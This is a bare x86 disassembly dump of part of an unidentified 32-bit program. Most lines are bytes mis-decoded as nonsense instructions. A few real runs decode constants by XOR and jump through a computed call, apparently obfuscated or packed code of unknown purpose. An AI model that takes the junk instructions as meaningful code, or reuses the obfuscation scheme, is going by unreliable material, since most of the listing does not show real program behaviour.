  40d6dc:	sub    bh,BYTE PTR [eax+eiz*1]
  40d6df:	shr    DWORD PTR [esi+0x51],cl
  40d6e2:	imul   edi,DWORD PTR [edx-0x77],0x1368d924
  40d6e9:	mov    ch,0xfe
  40d6eb:	xchg   edx,eax
  40d6ec:	pop    ss
  40d6ed:	mov    ecx,DWORD PTR [eax]
  40d6ef:	mov    eax,DWORD PTR [ebp-0x4]
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [ebx+0x7b],es
  40d728:	and    eax,DWORD PTR [ecx+0x7e7e8d05]
  40d72e:	and    bh,BYTE PTR [edi+0x7e]
  40d731:	jle    0x40d733
  40d733:	xchg   esi,eax
  40d734:	add    BYTE PTR [eax-0x4d66d9be],0x35
  40d73b:	aaa    
  40d73c:	or     cl,bl
  40d73e:	mov    ebx,0x1c2eb022
  40d743:	repnz rol DWORD PTR [edi+0x340a2138],cl
  40d74a:	aaa    
  40d74b:	(bad)  
  40d74c:	aam    0xa0
  40d74e:	enter  0xec08,0xad
  40d752:	popf   
  40d753:	dec    edi
  40d754:	lods   eax,DWORD PTR ds:[esi]
  40d755:	icebp  
  40d756:	fwait
  40d757:	mov    ebp,edx
  40d759:	mov    WORD PTR ss:[edi-0x734e2292],cs
  40d760:	int    0x8e
  40d762:	popf   
  40d763:	or     DWORD PTR [ebx],ecx
  40d765:	rol    BYTE PTR [ebx],cl
  40d767:	cwde   
  40d768:	cs ss je 0x40d77d
  40d76c:	push   edx
  40d76d:	pop    es
  40d76e:	repnz scas al,BYTE PTR es:[edi]
  40d770:	xor    DWORD PTR [edx+edx*2],ecx
  40d773:	dec    eax
  40d774:	lahf   
  40d775:	call   0x6b64:0xe74c20ab
  40d77c:	test   ebp,0xed73a3f8
  40d782:	outs   dx,BYTE PTR ds:[esi]
  40d783:	(bad)  
  40d784:	xchg   esp,eax
  40d785:	sub    eax,0x8b7a6ca1
  40d78a:	push   eax
  40d78b:	out    0x29,eax
  40d78d:	mov    ds:0xe63a8889,eax
  40d792:	push   ds
  40d793:	ret    0x5d65
  40d796:	les    eax,FWORD PTR [ebp-0x1640ace4]
  40d79c:	add    eax,0xb515b989
  40d7a1:	xchg   DWORD PTR [ebp-0x3c],eax
  40d7a4:	jl     0x40d792
  40d7a6:	call   0xd8d605e2
  40d7ab:	jo     0x4c6c44d9
  40d7b1:	mov    esp,0x76fe5b07
  40d7b6:	hlt    
  40d7b7:	shl    BYTE PTR [ebp-0x46692fc0],cl
  40d7bd:	cdq    
  40d7be:	fxch   st(6)
  40d7c0:	gs (bad) 
  40d7c3:	scas   eax,DWORD PTR es:[edi]
  40d7c4:	mov    dh,0x55
  40d7c6:	inc    eax
  40d7c7:	jmp    0xd2e9:0xe86b335f
  40d7ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7cf:	mov    ah,0x8c
  40d7d1:	xchg   esi,eax
  40d7d2:	(bad)
  40d7d6:	data16 jns 0x40d771
  40d7d9:	push   ebx
  40d7da:	dec    eax
  40d7db:	mov    BYTE PTR [edx],bl
  40d7dd:	xor    dl,dl
  40d7df:	gs push 0x771362fe
  40d7e5:	fimul  DWORD PTR [eax]
  40d7e7:	test   BYTE PTR [ebx+0x7f],bl
  40d7ea:	mov    WORD PTR [edi],gs
  40d7ec:	xor    cl,BYTE PTR [edi-0x697f8f57]
  40d7f2:	adc    BYTE PTR [edx+0x61],ah
  40d7f5:	test   ah,0xab
  40d7f8:	das    
  40d7f9:	sbb    ah,ch
  40d7fb:	test   DWORD PTR [edx+0x62],0xa51d83e7
  40d802:	inc    ebp
  40d803:	or     al,0x65
  40d805:	std    
  40d806:	adc    eax,DWORD PTR [ebp-0xa]
  40d809:	test   ebp,0x9c43c64c
  40d80f:	lods   eax,DWORD PTR ds:[esi]
  40d810:	loop   0x40d856
  40d812:	pop    esp
  40d813:	mov    ah,0x55
  40d815:	or     bl,BYTE PTR [ebp-0x68]
  40d818:	popf   
  40d819:	mov    esi,0x49446f10
  40d81e:	inc    esi
  40d81f:	cmp    edx,DWORD PTR [edi-0x38]
  40d822:	dec    sp
  40d824:	cmp    eax,0xe65bf283
  40d829:	push   edi
  40d82a:	daa    
  40d82b:	push   edi
  40d82c:	arpl   WORD PTR [ecx+edx*2-0x5782796c],bp
  40d833:	std    
  40d834:	xchg   edi,eax
  40d835:	cmp    al,0x6
  40d837:	retf   
  40d838:	sti    
  40d839:	cmp    dh,dl
  40d83b:	fiadd  DWORD PTR [edx]
  40d83d:	std    
  40d83e:	jno    0x40d8bf
  40d840:	pxor   mm3,QWORD PTR [ebx+0x63402556]
  40d847:	push   es
  40d848:	mov    ecx,0xc783e203
  40d84d:	jl     0x40d89c
  40d84f:	pop    es
  40d850:	push   eax
  40d851:	xchg   edx,eax
  40d852:	xor    edx,DWORD PTR [edi+0x6db2d18f]
  40d858:	sub    bh,BYTE PTR [ecx+eiz*2+0x59f3508e]
  40d85f:	push   0x5
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	cmp    ch,BYTE PTR [edx]
  40d87a:	mov    bl,0xd3
  40d87c:	sub    DWORD PTR [edx+0x7f227e7e],ecx
  40d882:	jle    0x40d902
  40d884:	xchg   BYTE PTR [eax-0x3032774d],bh
  40d88a:	stc    
  40d88b:	std    
  40d88c:	lods   al,BYTE PTR ds:[esi]
  40d88d:	out    dx,eax
  40d88e:	or     cl,BYTE PTR [eax-0x682a3ea4]
  40d894:	jo     0x40d856
  40d896:	jmp    0xea1afe02
  40d89b:	iret   
  40d89c:	loopne 0x40d8d2
  40d89e:	jge    0x40d8e5
  40d8a0:	cmc    
  40d8a1:	sbb    BYTE PTR [ecx-0x6ecacc28],cl
  40d8a7:	ret    
  40d8a8:	stc    
  40d8a9:	ds pop ebx
  40d8ab:	xor    eax,0x26b7f3b7
  40d8b0:	push   ecx
  40d8b1:	ds dec eax
  40d8b3:	mov    esp,0x823b87ad
  40d8b8:	imul   eax,DWORD PTR [ecx-0x1c],0xffffffe5
  40d8bc:	mov    cl,0x25
  40d8be:	ss xchg ebx,eax
  40d8c0:	push   eax
  40d8c1:	xor    BYTE PTR [ecx-0x798e8fea],0x74
  40d8c8:	out    dx,eax
  40d8c9:	and    al,0x1a
  40d8cb:	cmp    dl,dh
  40d8cd:	pop    edx
  40d8ce:	mov    eax,0x21656ccb
  40d8d3:	shl    dl,1
  40d8d5:	pop    edi
  40d8d6:	pushf  
  40d8d7:	(bad)  
  40d8d8:	out    0x98,eax
  40d8da:	push   esi
  40d8db:	xchg   edi,eax
  40d8dc:	cdq    
  40d8dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8de:	mov    edx,0x18254486
  40d8e3:	sub    esi,DWORD PTR [ebx-0x753b45bd]
  40d8e9:	ja     0x40d87d
  40d8eb:	push   ecx
  40d8ec:	jmp    0x40d901
  40d8ee:	ins    DWORD PTR es:[edi],dx
  40d8ef:	sbb    edi,eax
  40d8f1:	mov    eax,ds:0xb9e54356
  40d8f6:	ss jb  0x40d900
  40d8f9:	inc    edi
  40d8fa:	xor    bh,BYTE PTR [ecx-0x323f744f]
  40d900:	push   esp
  40d901:	push   esp
  40d902:	rol    eax,1
  40d904:	les    eax,FWORD PTR [edi+ecx*1-0x159afb73]
  40d90b:	xor    BYTE PTR [ecx-0x41],al
  40d90e:	jl     0x40d8bb
  40d910:	ficomp DWORD PTR [edi]
  40d912:	fsubr  DWORD PTR [eax+0x22]
  40d915:	dec    ebx
  40d916:	sub    ebx,esp
  40d918:	push   0xffffffb4
  40d91a:	out    dx,al
  40d91b:	aad    0xf6
  40d91d:	lods   al,BYTE PTR ds:[esi]
  40d91e:	stos   BYTE PTR es:[edi],al
  40d91f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d920:	jo     0x40d992
  40d922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d923:	sar    DWORD PTR [eax+0x44b0df59],1
  40d929:	pop    edi
  40d92a:	sub    eax,0xe1619587
  40d92f:	cmc    
  40d930:	adc    al,0xb
  40d932:	or     bh,0xe
  40d935:	int    0x61
  40d937:	aad    0x80
  40d939:	inc    ebp
  40d93a:	imul   eax,DWORD PTR ds:0x19fcd301,0x5d
  40d941:	or     DWORD PTR [edi],edi
  40d943:	inc    ecx
  40d944:	pop    ss
  40d945:	jl     0x40d8ef
  40d947:	cs popf 
  40d949:	sub    BYTE PTR [ebx+0x27],dh
  40d94c:	add    dl,BYTE PTR [esi+edx*1]
  40d94f:	(bad)  
  40d950:	in     al,0x6f
  40d952:	jg     0x40d932
  40d954:	xor    al,0xee
  40d956:	or     eax,edx
  40d958:	ins    BYTE PTR es:[edi],dx
  40d959:	ins    DWORD PTR es:[edi],dx
  40d95a:	inc    edx
  40d95b:	test   DWORD PTR [edx+0x43c90039],esi
  40d961:	js     0x40d9cd
  40d963:	mov    ebx,0xee15c9f9
  40d968:	arpl   si,dx
  40d96a:	in     eax,0xf7
  40d96c:	sbb    DWORD PTR [ecx-0x20a36dde],eax
  40d972:	mov    ebp,0xa0d2c651
  40d977:	and    BYTE PTR ds:0x3c8ba6d1,0x0
  40d97e:	dec    esp
  40d97f:	push   esi
  40d980:	sbb    DWORD PTR [eax+0x60a894dc],edx
  40d986:	mov    BYTE PTR [bx+si],ch
  40d989:	push   esp
  40d98a:	dec    esi
  40d98b:	xchg   esp,eax
  40d98c:	lea    ebx,[ebx-0x4d46cc94]
  40d992:	or     edx,esp
  40d994:	inc    edi
  40d995:	nop
  40d996:	add    eax,0x473543e3
  40d99b:	nop
  40d99c:	dec    ecx
  40d99d:	mov    ecx,0x2645eb8e
  40d9a2:	jae    0x40da0e
  40d9a4:	(bad)  
  40d9a5:	jne    0x40d94a
  40d9a7:	imul   eax,DWORD PTR [ecx+0x789550d7],0x19
  40d9ae:	push   ebp
  40d9af:	jmp    0x40d938
  40d9b1:	retf   
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	push   esi
  40d9c4:	setns  BYTE PTR [ebp+ebx*8+0x227e7e8b]
  40d9cc:	jg     0x40da4c
  40d9ce:	jle    0x40da13
  40d9d0:	adc    esp,DWORD PTR [ebx-0x29]
  40d9d3:	lahf   
  40d9d4:	int    0x2f
  40d9d6:	or     DWORD PTR [ecx],ecx
  40d9d8:	mov    esi,0x5aa2dc1c
  40d9dd:	into   
  40d9de:	aaa    
  40d9df:	outs   dx,BYTE PTR ds:[esi]
  40d9e0:	mov    bl,0xca
  40d9e2:	scas   eax,DWORD PTR es:[edi]
  40d9e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9e4:	loopne 0x40d9ef
  40d9e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9e7:	rol    BYTE PTR [edx+0x22],0xb5
  40d9eb:	jmp    0x82f3:0x2449e81c
  40d9f2:	xor    DWORD PTR [ebx*2-0x36c9d329],ebp
  40d9f9:	mov    DWORD PTR [ebx],eax
  40d9fb:	ret    
  40d9fc:	xor    eax,0xed13163b
  40da01:	inc    edx
  40da02:	jmp    0x40da24
  40da04:	adc    eax,0xc54c7f6d
  40da09:	inc    esp
  40da0a:	pop    ecx
  40da0b:	xor    eax,0xd6a2a0d4
  40da10:	outs   dx,BYTE PTR ds:[esi]
  40da11:	or     DWORD PTR [ebp-0x78],0x1b48ff9e
  40da18:	loope  0x40d9ad
  40da1a:	ja     0x40da06
  40da1c:	and    bh,BYTE PTR [ebx-0x71308f69]
  40da22:	xchg   ebp,eax
  40da23:	add    bh,dl
  40da25:	pop    esi
  40da26:	ror    DWORD PTR [ebx-0x54a5d7f3],0x9
  40da2d:	add    cl,0x57
  40da30:	in     eax,dx
  40da31:	fwait
  40da32:	adc    ah,BYTE PTR [edi-0x44]
  40da35:	push   eax
  40da36:	mov    edi,0x66cea716
  40da3b:	mov    dl,0xd8
  40da3d:	sub    bl,BYTE PTR [ebx+esi*1]
  40da40:	outs   dx,BYTE PTR ds:[esi]
  40da41:	push   ecx
  40da42:	lea    edi,[eax-0x79fab14d]
  40da48:	pop    eax
  40da49:	mov    ch,0xa1
  40da4b:	shl    dl,0xe4
  40da4e:	retf   
  40da4f:	sbb    DWORD PTR [esi],eax
  40da51:	push   ds
  40da52:	sahf   
  40da53:	cmp    ecx,DWORD PTR [ebx-0x2a]
  40da56:	std    
  40da57:	xchg   ecx,eax
  40da58:	sbb    BYTE PTR [eax],ah
  40da5a:	in     al,0x1b
  40da5c:	outs   dx,BYTE PTR ds:[esi]
  40da5d:	push   ss
  40da5e:	mov    ah,0xa7
  40da60:	loop   0x40daae
  40da62:	cld    
  40da63:	(bad)  
  40da64:	mov    ds:0x430eb265,al
  40da69:	ja     0x40dad1
  40da6b:	dec    esi
  40da6c:	mov    esi,0x23162c5
  40da71:	mov    esp,0x6b692954
  40da76:	into   
  40da77:	out    0xc8,al
  40da79:	repz sub eax,0x44778e34
  40da7f:	mov    WORD PTR [ebx+0x10],gs
  40da82:	cmp    eax,0x5aee0801
  40da87:	sub    eax,0x86761fae
  40da8c:	hlt    
  40da8d:	fisubr DWORD PTR [ecx+0x63]
  40da90:	imul   ebp,DWORD PTR [esp+eiz*4+0x7f],0x22
  40da95:	xor    esp,DWORD PTR [edx-0x3a]
  40da98:	push   ss
  40da99:	xchg   edx,eax
  40da9a:	dec    edi
  40da9b:	mov    ds:0x46229e7c,al
  40daa0:	xchg   DWORD PTR [bp+si-0x77],edx
  40daa4:	test   al,0xde
  40daa6:	pop    edi
  40daa7:	dec    edi
  40daa8:	push   ecx
  40daa9:	cmc    
  40daaa:	inc    edx
  40daab:	out    dx,al
  40daac:	shld   DWORD PTR [edx],edx,0xae
  40dab0:	pop    ebp
  40dab1:	daa    
  40dab2:	jae    0x40db18
  40dab4:	cmc    
  40dab5:	into   
  40dab6:	jo     0x40dabe
  40dab8:	jb     0x40da75
  40daba:	add    eax,0xa01c8327
  40dabf:	ret    0x9a99
  40dac2:	fwait
  40dac3:	test   BYTE PTR [edi-0x77],bl
  40dac6:	xchg   ebp,eax
  40dac7:	clc    
  40dac8:	clc    
  40dac9:	push   esi
  40daca:	test   BYTE PTR [ecx+0x54c4508e],dl
  40dad0:	leave  
  40dad1:	iret   
  40dad2:	pop    edi
  40dad3:	pop    ds
  40dad4:	add    al,0x86
  40dad6:	cmp    cl,dl
  40dad8:	or     ah,BYTE PTR cs:[eax-0x46]
  40dadc:	in     al,0xd5
  40dade:	leave  
  40dadf:	pop    ebp
  40dae0:	stc    
  40dae1:	jne    0x40dab2
  40dae3:	test   bh,0x24
  40dae6:	or     edi,DWORD PTR [eax+0x64]
  40dae9:	ins    BYTE PTR es:[edi],dx
  40daea:	sub    DWORD PTR [ecx-0x35],edi
  40daed:	(bad)  
  40daef:	pop    esi
  40daf0:	or     bh,BYTE PTR [ebx-0x759ff0f3]
  40daf6:	xor    al,0xb6
  40daf8:	adc    DWORD PTR [ebp+0x458b4989],ebx
  40dafe:	in     al,0xf
  40db00:	scas   eax,DWORD PTR es:[edi]
  40db01:	shr    DWORD PTR [ebx],0xe0
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x24b6fdf0
  40db32:	pop    esi
  40db33:	mov    bl,0x61
  40db35:	or     DWORD PTR [eax+0x7f227e7e],0x533f7e7e
  40db3f:	fbstp  TBYTE PTR [ecx+0x558d7ad6]
  40db45:	cli    
  40db46:	pop    es
  40db47:	add    edx,DWORD PTR [bp+si-0x29]
  40db4b:	add    DWORD PTR [edx-0x76],edi
  40db4e:	inc    ebx
  40db4f:	fsubr  QWORD PTR [edi+ebx*4+0x57]
  40db53:	or     esi,ebx
  40db55:	sub    DWORD PTR [edx-0x74bfdd4e],esi
  40db5b:	xor    al,0xe9
  40db5d:	inc    esi
  40db5e:	leave  
  40db5f:	les    esp,FWORD PTR [edi-0x79]
  40db62:	aad    0x1e
  40db64:	mov    esi,0x8c238750
  40db69:	and    DWORD PTR ds:0x26276bac,edx
  40db6f:	cwde   
  40db70:	pop    edi
  40db71:	out    dx,eax
  40db72:	mov    esp,DWORD PTR [esi]
  40db74:	add    edx,ebx
  40db76:	stc    
  40db77:	imul   DWORD PTR [ecx+0x75]
  40db7a:	cdq    
  40db7b:	outs   dx,BYTE PTR ds:[esi]
  40db7c:	in     al,dx
  40db7d:	(bad)  [edi]
  40db7f:	pop    ecx
  40db80:	inc    ebx
  40db81:	and    al,0xe
  40db83:	neg    BYTE PTR [edi+ecx*1+0x3d]
  40db87:	ficomp WORD PTR [ebp+0x335131dd]
  40db8d:	add    al,ch
  40db8f:	pop    ecx
  40db90:	mov    bl,0xae
  40db92:	pop    edi
  40db93:	loope  0x40dbc7
  40db95:	iret   
  40db96:	adc    DWORD PTR [ebp-0x13a3080e],ecx
  40db9c:	pop    esi
  40db9d:	jle    0x40db63
  40db9f:	adc    al,0x79
  40dba1:	xor    eax,0x8942ede6
  40dba6:	call   0x6453:0xc5b132c2
  40dbad:	inc    edx
  40dbae:	mov    ebx,0x490064a7
  40dbb3:	retf   
  40dbb4:	gs pop eax
  40dbb6:	lods   al,BYTE PTR ds:[esi]
  40dbb7:	(bad)  
  40dbb8:	shl    ch,cl
  40dbba:	out    0x62,al
  40dbbc:	sti    
  40dbbd:	(bad)  
  40dbbe:	push   edx
  40dbbf:	sub    ecx,DWORD PTR ds:0x30458287
  40dbc5:	repz out 0x8f,al
  40dbc8:	stc    
  40dbc9:	and    ch,al
  40dbcb:	cmp    al,0x72
  40dbcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbce:	pop    esp
  40dbcf:	(bad)  
  40dbd0:	idiv   esi
  40dbd2:	lds    edi,FWORD PTR [edi-0x68]
  40dbd5:	aam    0xf6
  40dbd7:	sbb    BYTE PTR [edi],bl
  40dbd9:	push   esi
  40dbda:	lahf   
  40dbdb:	push   cs
  40dbdc:	in     al,dx
  40dbdd:	mov    ah,0x47
  40dbdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbe0:	push   ecx
  40dbe1:	inc    ecx
  40dbe2:	retf   0xc14e
  40dbe5:	ins    DWORD PTR es:[edi],dx
  40dbe6:	cdq    
  40dbe7:	sahf   
  40dbe8:	(bad)  
  40dbea:	or     al,0x27
  40dbec:	push   0x65664612
  40dbf1:	loope  0x40dc62
  40dbf3:	je     0x40db8a
  40dbf5:	mov    cl,0xcf
  40dbf7:	sub    ebp,edi
  40dbf9:	dec    edx
  40dbfa:	pop    ds
  40dbfb:	out    dx,al
  40dbfc:	dec    eax
  40dbfd:	in     eax,0xa2
  40dbff:	outs   dx,BYTE PTR ds:[esi]
  40dc00:	mov    ebx,DWORD PTR ds:0xdcf17e37
  40dc06:	jp     0x40dc85
  40dc08:	inc    eax
  40dc09:	mov    esi,0x48ff0165
  40dc0e:	test   al,0xd1
  40dc10:	adc    DWORD PTR [ebp-0x5ecf36c0],ecx
  40dc16:	lea    edi,[edx+ebp*4-0x4]
  40dc1a:	cwde   
  40dc1b:	lock aaa 
  40dc1d:	daa    
  40dc1e:	repz das 
  40dc20:	es repz sar bl,cl
  40dc24:	mov    ds:0x38970cbc,eax
  40dc29:	aam    0x85
  40dc2b:	jl     0x40dc0c
  40dc2d:	retf   
  40dc2e:	and    ebx,edx
  40dc30:	sub    al,0xe4
  40dc32:	daa    
  40dc33:	xor    al,0xf3
  40dc35:	jmp    0x56548b25
  40dc3a:	inc    DWORD PTR [ecx]
  40dc3c:	aam    0x35
  40dc3e:	ret    
  40dc3f:	xchg   edi,eax
  40dc40:	and    ecx,DWORD PTR [eax]
  40dc42:	push   eax
  40dc43:	xchg   bl,ah
  40dc45:	pop    edx
  40dc46:	test   DWORD PTR [ecx-0x54],ebp
  40dc49:	in     eax,0x44
  40dc4b:	out    0x89,al
  40dc4d:	mov    DWORD PTR cs:[edi],ebx
  40dc50:	jo     0x40dc3f
  40dc52:	mov    edx,0x2f1698cd
  40dc57:	int    0x38
  40dc59:	dec    ecx
  40dc5a:	mov    cl,0x56
  40dc5c:	nop
  40dc5d:	leave  
  40dc5e:	dec    edx
  40dc5f:	jp     0x40dbeb
  40dc61:	inc    esi
  40dc62:	xchg   esi,eax
  40dc63:	xor    ah,BYTE PTR ss:[si]
  40dc67:	add    eax,0x8bc2038b
  40dc6c:	push   ebp
  40dc6d:	adc    al,0xf
  40dc6f:	scas   eax,DWORD PTR es:[edi]
  40dc70:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	cmc    
  40dcdd:	push   ecx
  40dcde:	arpl   WORD PTR [edx-0x4b],bp
  40dce1:	mov    DWORD PTR [esi+0x7e],edi
  40dce4:	and    bh,BYTE PTR [edi+0x7e]
  40dce7:	jle    0x40dd12
  40dce9:	jle    0x40dce3
  40dceb:	int3   
  40dcec:	dec    ebx
  40dced:	and    al,0xd0
  40dcef:	pop    ss
  40dcf0:	ror    ebp,0xd4
  40dcf3:	cld    
  40dcf4:	stc    
  40dcf5:	(bad)  
  40dcf6:	popf   
  40dcf7:	xor    BYTE PTR [ebx+0x4e1b9117],0xd6
  40dcfe:	ret    0xa750
  40dd01:	fwait
  40dd02:	aam    0x91
  40dd04:	pop    eax
  40dd05:	not    DWORD PTR [ebx+0x30399b8e]
  40dd0b:	clc    
  40dd0c:	mov    BYTE PTR [ebp-0x37],dh
  40dd0f:	jo     0x40dc95
  40dd11:	cmp    al,0xad
  40dd13:	rol    DWORD PTR [edx],cl
  40dd15:	dec    eax
  40dd16:	xchg   esp,eax
  40dd17:	(bad)  
  40dd18:	mov    eax,DWORD PTR [ebx+0x24]
  40dd1b:	loopne 0x40dd56
  40dd1d:	ror    DWORD PTR [eax-0x2a],1
  40dd20:	xor    eax,0x6cc03a3a
  40dd25:	sub    al,0x0
  40dd27:	jnp    0x40dd21
  40dd29:	retf   
  40dd2a:	adc    bl,BYTE PTR [ecx-0x5e]
  40dd2d:	xor    DWORD PTR [edx-0x3404509a],ebp
  40dd33:	push   esi
  40dd34:	sahf   
  40dd35:	outs   dx,DWORD PTR ds:[esi]
  40dd36:	jg     0x40dcd4
  40dd38:	pusha  
  40dd39:	and    BYTE PTR [eax+ebx*4-0x13],cl
  40dd3d:	or     BYTE PTR [ebp+0x5c],ah
  40dd40:	mov    esi,0xccbb5288
  40dd45:	adc    esi,DWORD PTR [eax-0x18]
  40dd48:	enter  0xaf0,0xa6
  40dd4c:	jecxz  0x40dd83
  40dd4e:	pop    ebx
  40dd4f:	rol    DWORD PTR [edi+0x15],cl
  40dd52:	cmp    bl,dl
  40dd54:	repz movsx ecx,di
  40dd58:	adc    BYTE PTR [esi],0x40
  40dd5b:	out    0x1,al
  40dd5d:	mov    esp,0xb4289492
  40dd62:	adc    cl,BYTE PTR [ebp-0x7d68a102]
  40dd68:	mov    ah,0xef
  40dd6a:	add    cl,0x5
  40dd6d:	out    dx,al
  40dd6e:	addr16 clc 
  40dd70:	sbb    eax,0x5553eac8
  40dd75:	mov    al,ds:0x3efbe86e
  40dd7a:	pop    edi
  40dd7b:	sbb    DWORD PTR [eax],0x116be808
  40dd81:	jae    0x40ddeb
  40dd83:	xchg   ecx,eax
  40dd84:	jbe    0x40de00
  40dd86:	sub    BYTE PTR [esi],al
  40dd88:	dec    edx
  40dd89:	nop
  40dd8a:	cwde   
  40dd8b:	mov    ds:0xb3853b68,al
  40dd90:	mov    al,ds:0xed7343ab
  40dd95:	addr16 xchg edx,eax
  40dd97:	push   eax
  40dd98:	push   ebx
  40dd99:	(bad)  
  40dd9a:	clc    
  40dd9b:	(bad)
  40dd9f:	adc    al,0xc3
  40dda1:	push   ebx
  40dda2:	out    dx,eax
  40dda3:	push   ecx
  40dda4:	or     bl,bl
  40dda6:	xor    BYTE PTR [eax-0x3d],dl
  40dda9:	ficom  DWORD PTR [esi+eiz*2+0x6f]
  40ddad:	mov    al,ds:0x2419325c
  40ddb2:	jae    0x40dda7
  40ddb4:	xor    eax,0xadb6018c
  40ddb9:	xor    esp,DWORD PTR [edx-0x5d669ef5]
  40ddbf:	or     ebx,esp
  40ddc1:	jb     0x40dd72
  40ddc3:	inc    ebp
  40ddc4:	mov    ds:0x34ff0d20,eax
  40ddc9:	(bad)  
  40ddca:	and    dl,BYTE PTR [edi+0x867c54f]
  40ddd0:	mov    ch,BYTE PTR [esi]
  40ddd2:	retf   0xa879
  40ddd5:	jmp    0x40de0e
  40ddd7:	shl    edx,cl
  40ddd9:	popa   
  40ddda:	jl     0x40dd6b
  40dddc:	nop
  40dddd:	lahf   
  40ddde:	imul   eax,DWORD PTR [ebx-0x338af399],0x6f75db42
  40dde8:	aas    
  40dde9:	jmp    0x2c1f:0x872e2f42
  40ddf0:	rol    DWORD PTR [edx+0x11],0x2c
  40ddf4:	mov    ah,0xfc
  40ddf6:	xor    eax,0x61eb21c6
  40ddfb:	sti    
  40ddfc:	shl    DWORD PTR [ebx],0xd
  40ddff:	stc    
  40de00:	xor    BYTE PTR [esi+0x41],0x51
  40de04:	and    BYTE PTR [esi],dh
  40de06:	fbld   TBYTE PTR [esi+edx*2]
  40de09:	sbb    bh,BYTE PTR [edx]
  40de0b:	cmp    ch,cl
  40de0d:	add    DWORD PTR [eax-0x20],esp
  40de10:	or     eax,0x89d73b27
  40de15:	inc    ebp
  40de16:	or     BYTE PTR [ebx+0x558be845],cl
  40de1c:	adc    al,0x33
  40de1e:	rol    DWORD PTR [ebx],0xc6
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
